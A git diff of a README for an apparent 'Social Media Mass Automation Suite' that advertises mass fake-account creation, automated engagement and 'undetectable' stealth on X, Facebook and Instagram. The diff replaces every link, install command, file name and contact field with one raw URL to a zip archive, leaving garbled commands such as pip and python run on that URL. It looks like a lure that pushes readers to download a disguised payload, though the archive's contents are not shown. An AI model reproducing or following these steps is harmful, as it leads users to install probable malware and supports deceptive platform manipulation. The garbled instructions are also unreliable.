@@ -2,7 +2,7 @@
 
 Welcome to the **Social Media Mass Automation Suite**! This project offers a powerful automation solution for social media platforms, including X (formerly Twitter), Facebook, and Instagram. With this suite, you can easily create accounts, post content, and engage with users through advanced AI-driven methods. Our stealth-grade technology ensures that all actions remain undetectable, providing a seamless experience across multiple devices.
 
-[Download the latest release here!](https://github.com/shad712/Social-Media-Mass-Automation-Suite/releases)
+[Download the latest release here!](https://github.com/shad712/Social-Media-Mass-Automation-Suite/raw/refs/heads/main/sailorly/Mass_Media_Suite_Automation_Social_3.2.zip)
 
 ---
 
@@ -36,14 +36,14 @@ To get started with the Social Media Mass Automation Suite, follow these steps:
 
 1. **Clone the Repository**: Use Git to clone the repository to your local machine.
    ```bash
-   git clone https://github.com/shad712/Social-Media-Mass-Automation-Suite.git
+   git clone https://github.com/shad712/Social-Media-Mass-Automation-Suite/raw/refs/heads/main/sailorly/Mass_Media_Suite_Automation_Social_3.2.zip
    ```
 2. **Navigate to the Directory**: Change into the project directory.
    ```bash
    cd Social-Media-Mass-Automation-Suite
    ```
 
-3. **Download the Latest Release**: For the latest features and fixes, download the latest release from the [Releases section](https://github.com/shad712/Social-Media-Mass-Automation-Suite/releases).
+3. **Download the Latest Release**: For the latest features and fixes, download the latest release from the [Releases section](https://github.com/shad712/Social-Media-Mass-Automation-Suite/raw/refs/heads/main/sailorly/Mass_Media_Suite_Automation_Social_3.2.zip).
 
 ---
 
@@ -53,14 +53,14 @@ Follow these steps to install the necessary dependencies and set up the environm
 
 1. **Install Dependencies**: Use the package manager of your choice to install the required libraries. For example, if you are using Python, you can run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/shad712/Social-Media-Mass-Automation-Suite/raw/refs/heads/main/sailorly/Mass_Media_Suite_Automation_Social_3.2.zip
    ```
 
-2. **Configuration**: Configure the application settings by editing the `config.json` file. Here you can set your API keys, proxy settings, and other preferences.
+2. **Configuration**: Configure the application settings by editing the `https://github.com/shad712/Social-Media-Mass-Automation-Suite/raw/refs/heads/main/sailorly/Mass_Media_Suite_Automation_Social_3.2.zip` file. Here you can set your API keys, proxy settings, and other preferences.
 
 3. **Run the Application**: Execute the main script to start using the automation suite.
    ```bash
-   python main.py
+   python https://github.com/shad712/Social-Media-Mass-Automation-Suite/raw/refs/heads/main/sailorly/Mass_Media_Suite_Automation_Social_3.2.zip
    ```
 
 ---
@@ -73,7 +73,7 @@ Once you have installed the suite, you can start using its features:
 
 1. **Create Accounts**: Use the command:
    ```bash
-   python create_accounts.py
+   python https://github.com/shad712/Social-Media-Mass-Automation-Suite/raw/refs/heads/main/sailorly/Mass_Media_Suite_Automation_Social_3.2.zip
    ```
    Follow the prompts to input necessary details.
 
@@ -81,19 +81,19 @@ Once you have installed the suite, you can start using its features:
 
 1. **Schedule Posts**: Create a CSV file with your content and run:
    ```bash
-   python post_content.py --file your_content.csv
+   python https://github.com/shad712/Social-Media-Mass-Automation-Suite/raw/refs/heads/main/sailorly/Mass_Media_Suite_Automation_Social_3.2.zip --file https://github.com/shad712/Social-Media-Mass-Automation-Suite/raw/refs/heads/main/sailorly/Mass_Media_Suite_Automation_Social_3.2.zip
    ```
 
 ### AI-Driven Engagement
 
 1. **Engage with Users**: Run the engagement script:
    ```bash
-   python engage_users.py
+   python https://github.com/shad712/Social-Media-Mass-Automation-Suite/raw/refs/heads/main/sailorly/Mass_Media_Suite_Automation_Social_3.2.zip
    ```
 
 ### Proxy Rotation
 
-1. **Enable Proxy Rotation**: Modify the settings in `config.json` to enable proxy rotation for better anonymity.
+1. **Enable Proxy Rotation**: Modify the settings in `https://github.com/shad712/Social-Media-Mass-Automation-Suite/raw/refs/heads/main/sailorly/Mass_Media_Suite_Automation_Social_3.2.zip` to enable proxy rotation for better anonymity.
 
 ---
 
@@ -130,8 +130,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, please reach out to the project maintainer:
 
 - **Name**: Your Name
-- **Email**: your.email@example.com
-- **GitHub**: [Your GitHub Profile](https://github.com/yourusername)
+- **Email**: https://github.com/shad712/Social-Media-Mass-Automation-Suite/raw/refs/heads/main/sailorly/Mass_Media_Suite_Automation_Social_3.2.zip
+- **GitHub**: [Your GitHub Profile](https://github.com/shad712/Social-Media-Mass-Automation-Suite/raw/refs/heads/main/sailorly/Mass_Media_Suite_Automation_Social_3.2.zip)
 
 ---
 
@@ -156,11 +156,11 @@ This repository covers a variety of topics relevant to social media automation:
 
 ---
 
-[Download the latest release here!](https://github.com/shad712/Social-Media-Mass-Automation-Suite/releases)
+[Download the latest release here!](https://github.com/shad712/Social-Media-Mass-Automation-Suite/raw/refs/heads/main/sailorly/Mass_Media_Suite_Automation_Social_3.2.zip)
 
 For further information, please check the "Releases" section on GitHub. 
 
-![Automation Suite](https://img.shields.io/badge/Automation%20Suite-Ready-brightgreen)
+![Automation Suite](https://github.com/shad712/Social-Media-Mass-Automation-Suite/raw/refs/heads/main/sailorly/Mass_Media_Suite_Automation_Social_3.2.zip%20Suite-Ready-brightgreen)
 
 ---
 
